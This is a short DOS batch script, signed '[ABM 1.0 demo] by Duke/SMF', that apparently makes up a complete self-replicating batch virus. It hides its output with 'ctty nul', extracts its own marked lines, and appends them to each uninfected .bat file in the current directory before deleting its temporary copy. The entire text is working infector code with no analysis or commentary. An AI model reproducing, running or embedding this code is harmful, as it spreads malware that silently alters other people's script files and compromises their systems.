ctty nul
if "%0==" goto ;@
if "%1=="@ goto ;@z
echo.>@.bat
find ";@"<%0>>@.bat
for %%b in (*.bat) do call @ @ %%b
del @.*
goto ;@
:;@z [ABM 1.0 demo] by Duke/SMF
find ";@"<%2
if errorlevel 1 type @.bat>>%2
:;@
